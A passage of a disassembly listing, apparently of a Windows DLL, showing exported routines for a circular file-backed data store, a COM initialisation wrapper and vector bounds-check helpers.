		jbe	short loc_6AF3C38A
		mov	ecx, [ebp+var_18]
		sub	eax, edx
		add	ecx, eax
		cmp	ecx, 0FFFFFFFFh
		jbe	short loc_6AF3C364
		push	offset aCdatastoreAddU ; "CDataStore::Add() : uBlockSize > DWORD("...
		call	sub_6AF3101A
		pop	ecx

loc_6AF3C35F:				; CODE XREF: Ordinal433+149j
					; Ordinal433+1CBj
		mov	eax, [ebp+var_18]
		jmp	short loc_6AF3C3D7
; ---------------------------------------------------------------------------

loc_6AF3C364:				; CODE XREF: Ordinal433+195j
		sub	edi, eax
		lea	eax, [ebp+Buffer]
		sbb	ebx, 0
		mov	[ebp+var_18], ecx
		push	eax
		mov	ecx, esi
		mov	[ebp+var_28], edi
		mov	[ebp+var_24], ebx
		mov	[ebp+var_58], edx
		call	Ordinal612
		test	eax, eax
		jz	loc_6AF3C511
		jmp	short loc_6AF3C35F
; ---------------------------------------------------------------------------

loc_6AF3C38A:				; CODE XREF: Ordinal433+189j
		mov	eax, [ebp+var_18]

loc_6AF3C38D:				; CODE XREF: Ordinal433+14Fj
					; Ordinal433+154j ...
		xor	ecx, ecx
		add	eax, edi
		adc	ecx, ebx
		add	eax, 28h
		adc	ecx, 0
		cmp	ecx, [ebp+var_4]
		ja	short loc_6AF3C3E2
		jb	short loc_6AF3C3A5
		cmp	eax, [ebp+var_8]
		jnb	short loc_6AF3C3E2

loc_6AF3C3A5:				; CODE XREF: Ordinal433+1E1j
		lea	edx, [ebp+var_98]
		push	edx		; lpBuffer
		lea	edx, [ebp+var_8]
		push	edx		; int
		push	ecx		; int
		push	eax		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal611
		test	eax, eax
		jz	loc_6AF3C44F
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_80]
		lea	eax, [ecx+eax+28h]
		cmp	eax, 0FFFFFFFFh
		ja	loc_6AF3C459
		mov	[ebp+var_18], eax

loc_6AF3C3D7:				; CODE XREF: Ordinal433+1A5j
		cmp	eax, [ebp+nNumberOfBytesToWrite]
		jb	loc_6AF3C308
		jmp	short loc_6AF3C402
; ---------------------------------------------------------------------------

loc_6AF3C3E2:				; CODE XREF: Ordinal433+1DFj
					; Ordinal433+1E6j ...
		push	ebx		; int
		lea	ecx, [esi+8]
		push	edi		; lDistanceToMove
		call	Ordinal789
		test	eax, eax
		jz	short loc_6AF3C445
		mov	[ebp+var_8], edi
		mov	[ebp+var_4], ebx
		mov	[ebp+var_28], edi
		mov	[ebp+var_24], ebx

loc_6AF3C3FC:				; CODE XREF: Ordinal433+127j
		mov	eax, [ebp+nNumberOfBytesToWrite]
		mov	[ebp+var_18], eax

loc_6AF3C402:				; CODE XREF: Ordinal433+223j
		mov	ecx, [ebp+nNumberOfBytesToWrite]
		cmp	eax, ecx
		mov	[ebp+var_14], ecx
		jbe	short loc_6AF3C46F
		xor	ecx, ecx
		add	eax, edi
		adc	ecx, ebx
		add	eax, 28h
		adc	ecx, 0
		cmp	eax, [ebp+var_8]
		jnz	short loc_6AF3C46F
		cmp	ecx, [ebp+var_4]
		jnz	short loc_6AF3C46F
		mov	eax, [ebp+nNumberOfBytesToWrite]
		xor	ecx, ecx
		add	eax, edi
		adc	ecx, ebx
		add	eax, 28h
		adc	ecx, 0
		push	ecx		; int
		mov	[ebp+var_4], ecx
		push	eax		; lDistanceToMove
		lea	ecx, [esi+8]
		mov	[ebp+var_8], eax
		call	Ordinal789
		test	eax, eax
		jnz	short loc_6AF3C469

loc_6AF3C445:				; CODE XREF: Ordinal433+EFj
					; Ordinal433+231j
		push	offset aCcircularsto_6 ; "CCircularStore::Add()	: m_File.SetLengt"...
		jmp	loc_6AF3C51D
; ---------------------------------------------------------------------------

loc_6AF3C44F:				; CODE XREF: Ordinal433+13Fj
					; Ordinal433+174j ...
		push	offset aCcircularsto_7 ; "CCircularStore::Add()	: ReadIndex() == "...
		jmp	loc_6AF3C51D
; ---------------------------------------------------------------------------

loc_6AF3C459:				; CODE XREF: Ordinal433+211j
		push	offset aCdatastoreAddU ; "CDataStore::Add() : uBlockSize > DWORD("...
		call	sub_6AF3101A
		pop	ecx
		jmp	loc_6AF3C3E2
; ---------------------------------------------------------------------------

loc_6AF3C469:				; CODE XREF: Ordinal433+286j
		mov	eax, [ebp+var_14]
		mov	[ebp+var_18], eax

loc_6AF3C46F:				; CODE XREF: Ordinal433+24Dj
					; Ordinal433+25Ej ...
		cmp	dword ptr [esi+1Ch], 0
		jz	short loc_6AF3C487
		push	[ebp+nNumberOfBytesToWrite]
		push	[ebp+lpBuffer]
		call	Ordinal581
		pop	ecx
		pop	ecx
		mov	[ebp+var_10], eax
		jmp	short loc_6AF3C48B
; ---------------------------------------------------------------------------

loc_6AF3C487:				; CODE XREF: Ordinal433+2B6j
		and	[ebp+var_10], 0

loc_6AF3C48B:				; CODE XREF: Ordinal433+2C8j
		lea	eax, [ebp+Dst]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_28], edi
		mov	[ebp+var_24], ebx
		call	Ordinal612
		test	eax, eax
		jz	short loc_6AF3C506
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		mov	eax, [ebp+var_28]
		push	[ebp+lpBuffer]	; lpBuffer
		mov	ecx, [ebp+var_24]
		add	eax, 28h
		adc	ecx, 0
		push	ecx		; int
		push	eax		; lDistanceToMove
		lea	ecx, [esi+8]
		call	Ordinal781
		test	eax, eax
		jz	short loc_6AF3C506
		mov	ecx, [ebp+var_18]
		xor	edx, edx
		add	ecx, edi
		adc	edx, ebx
		add	ecx, 28h
		lea	eax, [esi+0C0h]
		adc	edx, 0
		mov	[eax], ecx
		push	eax		; lpBuffer
		mov	ecx, esi
		mov	[eax+4], edx
		mov	[esi+0C8h], edi
		mov	[esi+0CCh], ebx
		call	Ordinal442
		test	eax, eax
		jnz	short loc_6AF3C4F9
		push	offset aCcircularsto_8 ; "CCircularStore::Add()	: WriteOffset()	="...
		jmp	short loc_6AF3C51D
; ---------------------------------------------------------------------------

loc_6AF3C4F9:				; CODE XREF: Ordinal433+333j
		mov	eax, [ebp+arg_8]
		xor	esi, esi
		mov	[eax], edi
		mov	[eax+4], ebx
		inc	esi
		jmp	short loc_6AF3C525
; ---------------------------------------------------------------------------

loc_6AF3C506:				; CODE XREF: Ordinal433+2E1j
					; Ordinal433+301j
		lea	ecx, [esi+8]
		call	Ordinal236
		mov	[esi+14h], eax

loc_6AF3C511:				; CODE XREF: Ordinal433+1C5j
		push	offset aCcircularsto_9 ; "CCircularStore::Add()	: WriteIndex() =="...
		jmp	short loc_6AF3C51D
; ---------------------------------------------------------------------------

loc_6AF3C518:				; CODE XREF: Ordinal433+2Fj
					; Ordinal433+38j
		push	offset aCcircularst_10 ; "CCircularStore::Add()	: dwSize == 0\n"

loc_6AF3C51D:				; CODE XREF: Ordinal433+68j
					; Ordinal433+94j ...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi

loc_6AF3C525:				; CODE XREF: Ordinal433+347j
		lea	ecx, [ebp+var_48]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal433	endp

; Exported entry 441.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal441
Ordinal441	proc near		; DATA XREF: .rdata:6AF587ACo
					; .rdata:off_6AF66098o

Buffer		= byte ptr -40h
lDistanceToMove	= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		push	edi
		mov	edi, ecx
		call	Ordinal609
		test	eax, eax
		jnz	short loc_6AF3C54F
		push	offset aCcircularst_11 ; "CCircularStore::ValidateFile() : CDataS"...
		jmp	short loc_6AF3C563
; ---------------------------------------------------------------------------

loc_6AF3C54F:				; CODE XREF: Ordinal441+10j
		lea	eax, [ebp+lDistanceToMove]
		push	eax		; lpBuffer
		mov	ecx, edi
		call	Ordinal443
		test	eax, eax
		jnz	short loc_6AF3C570
		push	offset aCcircularst_12 ; "CCircularStore::ValidateFile() : ReadOf"...

loc_6AF3C563:				; CODE XREF: Ordinal441+17j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3C653
; ---------------------------------------------------------------------------

loc_6AF3C570:				; CODE XREF: Ordinal441+26j
		and	[ebp+var_8], 0
		and	[ebp+var_4], 0
		push	esi		; Args
		lea	eax, [ebp+var_8]
		lea	esi, [edi+8]
		push	eax
		mov	ecx, esi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF3C5A7
		mov	ecx, esi
		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCcircularst_13 ; "CCircularStore::ValidateFile() : m_File"...

loc_6AF3C59A:				; CODE XREF: Ordinal441+10Aj
					; Ordinal441+114j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3C652
; ---------------------------------------------------------------------------

loc_6AF3C5A7:				; CODE XREF: Ordinal441+53j
		mov	esi, [ebp+lDistanceToMove]
		mov	edx, [ebp+var_14]
		mov	eax, esi
		or	eax, edx
		jz	loc_6AF3C64F
		mov	ecx, [ebp+var_4]
		cmp	edx, ecx
		ja	loc_6AF3C645
		mov	eax, [ebp+var_8]
		jb	short loc_6AF3C5CB
		cmp	esi, eax
		ja	short loc_6AF3C645

loc_6AF3C5CB:				; CODE XREF: Ordinal441+8Fj
		cmp	[ebp+var_C], ecx
		ja	short loc_6AF3C645
		jb	short loc_6AF3C5D7
		cmp	[ebp+var_10], eax
		ja	short loc_6AF3C645

loc_6AF3C5D7:				; CODE XREF: Ordinal441+9Aj
		mov	eax, [edi+20h]
		xor	ecx, ecx
		add	eax, 20h
		cmp	edx, ecx
		jb	short loc_6AF3C645
		ja	short loc_6AF3C5E9
		cmp	esi, eax
		jb	short loc_6AF3C645

loc_6AF3C5E9:				; CODE XREF: Ordinal441+ADj
		cmp	[ebp+var_C], ecx
		jb	short loc_6AF3C645
		ja	short loc_6AF3C5F5
		cmp	[ebp+var_10], eax
		jb	short loc_6AF3C645

loc_6AF3C5F5:				; CODE XREF: Ordinal441+B8j
		cmp	esi, [ebp+var_8]
		jnz	short loc_6AF3C5FF
		cmp	edx, [ebp+var_4]
		jz	short loc_6AF3C614

loc_6AF3C5FF:				; CODE XREF: Ordinal441+C2j
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	edx		; int
		push	esi		; lDistanceToMove
		mov	ecx, edi
		call	Ordinal611
		test	eax, eax
		jz	short loc_6AF3C63B

loc_6AF3C614:				; CODE XREF: Ordinal441+C7j
		mov	eax, [ebp+var_10]
		cmp	eax, [ebp+var_8]
		jnz	short loc_6AF3C624
		mov	ecx, [ebp+var_C]
		cmp	ecx, [ebp+var_4]
		jz	short loc_6AF3C64F

loc_6AF3C624:				; CODE XREF: Ordinal441+E4j
		lea	ecx, [ebp+Buffer]
		push	ecx		; lpBuffer
		lea	ecx, [ebp+var_8]
		push	ecx		; int
		push	[ebp+var_C]	; int
		mov	ecx, edi
		push	eax		; lDistanceToMove
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF3C64F

loc_6AF3C63B:				; CODE XREF: Ordinal441+DCj
		push	offset aCcircularst_14 ; "CCircularStore::ValidateFile() : ReadIn"...
		jmp	loc_6AF3C59A
; ---------------------------------------------------------------------------

loc_6AF3C645:				; CODE XREF: Ordinal441+86j
					; Ordinal441+93j ...
		push	offset aCcircularst_15 ; "CCircularStore::ValidateFile() : offset"...
		jmp	loc_6AF3C59A
; ---------------------------------------------------------------------------

loc_6AF3C64F:				; CODE XREF: Ordinal441+7Bj
					; Ordinal441+ECj ...
		xor	eax, eax
		inc	eax

loc_6AF3C652:				; CODE XREF: Ordinal441+6Cj
		pop	esi

loc_6AF3C653:				; CODE XREF: Ordinal441+35j
		pop	edi
		leave
		retn
Ordinal441	endp

; Exported entry 426.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal426
Ordinal426	proc near		; CODE XREF: sub_6AF3C72E+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF587A8
		call	Ordinal431
		mov	ecx, esi
		pop	esi
		jmp	Ordinal585
Ordinal426	endp

; Exported entry 430.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal430
Ordinal430	proc near		; CODE XREF: Ordinal427+94p
					; DATA XREF: .rdata:off_6AF66098o

var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		mov	edi, [ebp+arg_4]
		or	eax, edi
		jnz	short loc_6AF3C6A3
		mov	[esi+0B8h], ebx
		mov	[esi+0BCh], ebx
		jmp	short loc_6AF3C71A
; ---------------------------------------------------------------------------

loc_6AF3C6A3:				; CODE XREF: Ordinal430+27j
		mov	eax, [esi+20h]
		xor	ecx, ecx
		add	eax, 48h
		cmp	edi, ecx
		ja	short loc_6AF3C6C5
		jb	short loc_6AF3C6B6
		cmp	[ebp+arg_0], eax
		jnb	short loc_6AF3C6C5

loc_6AF3C6B6:				; CODE XREF: Ordinal430+43j
		push	offset aCcircularst_16 ; "CCircularStore::SetMaxSize() : uMaxSize"...

loc_6AF3C6BB:				; CODE XREF: Ordinal430+7Aj
					; Ordinal430+9Dj
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3C71D
; ---------------------------------------------------------------------------

loc_6AF3C6C5:				; CODE XREF: Ordinal430+41j
					; Ordinal430+48j
		lea	eax, [ebp+var_8]
		lea	ebx, [esi+8]
		push	eax
		mov	ecx, ebx
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF3C6E8
		mov	ecx, ebx
		call	Ordinal236
		mov	[esi+14h], eax
		push	offset aCcircularst_17 ; "CCircularStore::SetMaxSize() : m_File.G"...
		jmp	short loc_6AF3C6BB
; ---------------------------------------------------------------------------

loc_6AF3C6E8:				; CODE XREF: Ordinal430+69j
		mov	eax, [ebp+var_4]
		cmp	eax, edi
		jb	short loc_6AF3C70B
		ja	short loc_6AF3C6F9
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+arg_0]
		jbe	short loc_6AF3C70B

loc_6AF3C6F9:				; CODE XREF: Ordinal430+83j
		mov	ecx, esi
		call	Ordinal432
		test	eax, eax
		jnz	short loc_6AF3C70B
		push	offset aCcircularst_18 ; "CCircularStore::SetMaxSize() : Clear() "...
		jmp	short loc_6AF3C6BB
; ---------------------------------------------------------------------------

loc_6AF3C70B:				; CODE XREF: Ordinal430+81j
					; Ordinal430+8Bj ...
		mov	eax, [ebp+arg_0]
		mov	[esi+0B8h], eax
		mov	[esi+0BCh], edi

loc_6AF3C71A:				; CODE XREF: Ordinal430+35j
		xor	esi, esi
		inc	esi

loc_6AF3C71D:				; CODE XREF: Ordinal430+57j
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal430	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3C72E(void *, char)
sub_6AF3C72E	proc near		; DATA XREF: .rdata:off_6AF587A8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal426
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3C744
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3C744:				; CODE XREF: sub_6AF3C72E+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3C72E	endp

; Exported entry 427.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal427
Ordinal427	proc near		; CODE XREF: Ordinal428+2Ap
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  8
dwDesiredAccess	= dword	ptr  0Ch
dwShareMode	= dword	ptr  10h
lpSecurityAttributes= dword ptr	 14h
nNumberOfBytesToWrite= dword ptr  18h
dwFlagsAndAttributes= dword ptr	 1Ch
hTemplateFile	= dword	ptr  20h
arg_1C		= dword	ptr  24h
arg_20		= dword	ptr  28h
arg_24		= dword	ptr  2Ch

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_1C]
		push	edi
		add	eax, 10h
		push	eax		; int
		push	[ebp+hTemplateFile] ; hTemplateFile
		mov	edi, ecx
		push	[ebp+dwFlagsAndAttributes] ; dwFlagsAndAttributes
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		push	[ebp+lpSecurityAttributes] ; lpSecurityAttributes
		push	[ebp+dwShareMode] ; dwShareMode
		push	[ebp+dwDesiredAccess] ;	dwDesiredAccess
		push	[ebp+Args]	; Args
		call	Ordinal587
		test	eax, eax
		jnz	short loc_6AF3C784
		push	offset aCcircularst_19 ; "CCircularStore::Open() : CDataStore::Op"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF3C7F2
; ---------------------------------------------------------------------------

loc_6AF3C784:				; CODE XREF: Ordinal427+29j
		push	esi		; Args
		lea	esi, [edi+0C0h]
		push	esi		; lpBuffer
		mov	ecx, edi
		call	Ordinal443
		test	eax, eax
		jnz	short loc_6AF3C7A6
		push	offset aCcircularst_20 ; "CCircularStore::Open() : ReadOffset()	="...

loc_6AF3C79C:				; CODE XREF: Ordinal427+A2j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF3C7F1
; ---------------------------------------------------------------------------

loc_6AF3C7A6:				; CODE XREF: Ordinal427+4Bj
		mov	eax, [esi]
		or	eax, [esi+4]
		jz	short loc_6AF3C7BB
		mov	eax, [edi+0C8h]
		or	eax, [edi+0CCh]
		jnz	short loc_6AF3C7D6

loc_6AF3C7BB:				; CODE XREF: Ordinal427+61j
		mov	eax, [edi+20h]
		add	eax, 20h
		and	dword ptr [esi+4], 0
		mov	[esi], eax
		mov	[edi+0C8h], eax
		mov	eax, [esi+4]
		mov	[edi+0CCh], eax

loc_6AF3C7D6:				; CODE XREF: Ordinal427+6Fj
		push	[ebp+arg_24]
		mov	ecx, edi
		push	[ebp+arg_20]
		call	Ordinal430
		test	eax, eax
		jnz	short loc_6AF3C7EE
		push	offset aCcircularst_21 ; "CCircularStore::Open() : SetMaxSize()	="...
		jmp	short loc_6AF3C79C
; ---------------------------------------------------------------------------

loc_6AF3C7EE:				; CODE XREF: Ordinal427+9Bj
		xor	eax, eax
		inc	eax

loc_6AF3C7F1:				; CODE XREF: Ordinal427+5Aj
		pop	esi

loc_6AF3C7F2:				; CODE XREF: Ordinal427+38j
		pop	edi
		pop	ebp
		retn	28h
Ordinal427	endp

; Exported entry 428.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal428
Ordinal428	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_10]
		mov	eax, [ebp+arg_4]
		push	[ebp+arg_C]
		neg	eax
		push	[ebp+arg_8]
		sbb	eax, eax
		push	0
		push	80h
		add	eax, 3
		push	eax
		push	0
		push	1
		push	0C0000000h
		push	[ebp+arg_0]
		call	Ordinal427
		pop	ebp
		retn	14h
Ordinal428	endp

; Exported entry 446.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal446
Ordinal446	proc near		; CODE XREF: Ordinal444+1Ap
					; Ordinal1074+168p ...

var_8		= byte ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		cmp	[ebp+arg_0], 0
		jnz	short loc_6AF3C850
		lea	ecx, [ebp+var_8]
		call	Ordinal623
		lea	ecx, [ebp+var_8]
		call	Ordinal1118
		lea	ecx, [ebp+var_8]
		mov	[ebp+arg_0], eax
		call	Ordinal624

loc_6AF3C850:				; CODE XREF: Ordinal446+9j
		mov	eax, [ebp+arg_0]
		dec	eax
		push	esi
		jz	short loc_6AF3C889
		dec	eax
		jz	short loc_6AF3C868
		dec	eax
		jz	short loc_6AF3C864
		mov	eax, 80004005h
		jmp	short loc_6AF3C886
; ---------------------------------------------------------------------------

loc_6AF3C864:				; CODE XREF: Ordinal446+31j
		xor	eax, eax
		jmp	short loc_6AF3C886
; ---------------------------------------------------------------------------

loc_6AF3C868:				; CODE XREF: Ordinal446+2Ej
		push	2
		pop	esi
		mov	eax, offset aCoinit_apartme ; "COINIT_APARTMENTTHREADED"

loc_6AF3C870:				; CODE XREF: Ordinal446+66j
		push	eax		; Args
		push	offset aCcoinitializeC ; "CCoInitialize::CoInitialize()	: %s\n"
		call	sub_6AF31006
		pop	ecx
		pop	ecx
		push	esi		; dwCoInit
		push	0		; pvReserved
		call	ds:CoInitializeEx

loc_6AF3C886:				; CODE XREF: Ordinal446+38j
					; Ordinal446+3Cj
		pop	esi
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF3C889:				; CODE XREF: Ordinal446+2Bj
		xor	esi, esi
		mov	eax, offset aCoinit_multith ; "COINIT_MULTITHREADED"
		jmp	short loc_6AF3C870
Ordinal446	endp

; Exported entry 447.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal447
Ordinal447	proc near		; CODE XREF: Ordinal445+21j
					; Ordinal1074+6B7p ...

ms_exc		= CPPEH_RECORD ptr -18h

		push	8
		push	offset stru_6AF58DC8
		call	__SEH_prolog
		and	[ebp+ms_exc.disabled], 0
		call	ds:CoUninitialize
		jmp	short loc_6AF3C8CC
; ---------------------------------------------------------------------------

loc_6AF3C8AA:				; DATA XREF: .rdata:stru_6AF58DC8o
		mov	eax, [ebp+ms_exc.exc_ptr] ; Exception filter 0 for function 6AF3C892
		mov	eax, [eax]
		mov	eax, [eax]
		xor	ecx, ecx
		cmp	eax, 0C0000005h
		setz	cl
		mov	eax, ecx
		retn
; ---------------------------------------------------------------------------

loc_6AF3C8BE:				; DATA XREF: .rdata:stru_6AF58DC8o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF3C892
		push	offset aCcoinitializ_2 ; "CCoInitialize::CoUninitialize() : GetEx"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3C8CC:				; CODE XREF: Ordinal447+16j
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		call	__SEH_epilog
		retn
Ordinal447	endp

; Exported entry 444.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal444
Ordinal444	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		push	edi
		push	eax
		mov	dword ptr [esi], offset	off_6AF58E1C
		mov	[esi+0Ch], eax
		call	Ordinal446
		mov	edi, eax
		test	edi, edi
		pop	ecx
		jl	short loc_6AF3C90E
		mov	dword ptr [esi+4], 1
		call	ds:GetCurrentThreadId
		mov	[esi+8], eax
		jmp	short loc_6AF3C921
; ---------------------------------------------------------------------------

loc_6AF3C90E:				; CODE XREF: Ordinal444+24j
		push	edi		; Args
		push	offset aCcoinitializ_0 ; "CCoInitialize::CCoInitialize() : CoInit"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		push	edi
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF3C921:				; CODE XREF: Ordinal444+36j
		pop	edi
		mov	eax, esi
		pop	esi
		retn	4
Ordinal444	endp

; Exported entry 445.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal445
Ordinal445	proc near		; CODE XREF: sub_6AF3C95B+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+4], 0
		mov	dword ptr [esi], offset	off_6AF58E1C
		jz	short loc_6AF3C959
		cmp	dword ptr [esi+0Ch], 3
		jz	short loc_6AF3C959
		call	ds:GetCurrentThreadId
		cmp	[esi+8], eax
		jnz	short loc_6AF3C94E
		pop	esi
		jmp	Ordinal447
; ---------------------------------------------------------------------------

loc_6AF3C94E:				; CODE XREF: Ordinal445+1Ej
		push	offset aCcoinitializ_1 ; "CCoInitialize::~CCoInitialize() : m_dwT"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3C959:				; CODE XREF: Ordinal445+Dj
					; Ordinal445+13j
		pop	esi
		retn
Ordinal445	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3C95B(void *, char)
sub_6AF3C95B	proc near		; DATA XREF: .rdata:off_6AF58E1Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal445
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3C971
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3C971:				; CODE XREF: sub_6AF3C95B+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3C95B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3C977	proc near		; CODE XREF: .text:6AF3CA22j
					; sub_6AF3CB41+3p ...
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF3C981
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3C981:				; CODE XREF: sub_6AF3C977+5j
		mov	eax, [ecx+8]
		sub	eax, edx
		sar	eax, 4
		retn
sub_6AF3C977	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3C98A	proc near		; CODE XREF: sub_6AF3D245+29p
					; sub_6AF3D737+10p
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF3C994
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3C994:				; CODE XREF: sub_6AF3C98A+5j
		mov	eax, [ecx+0Ch]
		sub	eax, edx
		sar	eax, 4
		retn
sub_6AF3C98A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF3C99D	proc near		; CODE XREF: sub_6AF3CB41+12p

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_56 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aInvalidVectorT ; "invalid vector<T> subscript"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61F1C
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF548A0
		call	_CxxThrowException
sub_6AF3C99D	endp

; ---------------------------------------------------------------------------
		align 2

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF3C9DE	proc near		; CODE XREF: sub_6AF3D245+4Fp
					; sub_6AF3D460+4Fp

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_56 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aVectorTTooLong ; "vector<T> too	long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
sub_6AF3C9DE	endp

; ---------------------------------------------------------------------------
		db 0CCh
; ---------------------------------------------------------------------------
; Exported entry 456.

		public Ordinal456
Ordinal456:				; DATA XREF: .rdata:off_6AF66098o
		add	ecx, 0Ch
		jmp	sub_6AF3C977
; Exported entry 452.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal452(unsigned __int8 *, int)
		public Ordinal452
Ordinal452	proc near		; CODE XREF: Ordinal453+1Cp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, [edi+10h]
		xor	ebx, ebx
		jmp	short loc_6AF3CA52
; ---------------------------------------------------------------------------

loc_6AF3CA33:				; CODE XREF: Ordinal452+2Ej
		mov	eax, [esi+8]
		push	[esp+0Ch+arg_0]	; unsigned __int8 *
		push	eax		; unsigned __int8 *
		call	ds:_mbsicmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_6AF3CA4F
		mov	eax, [esi]
		cmp	eax, [esp+0Ch+arg_4]
		jz	short loc_6AF3CA59

loc_6AF3CA4F:				; CODE XREF: Ordinal452+1Ej
		add	esi, 10h

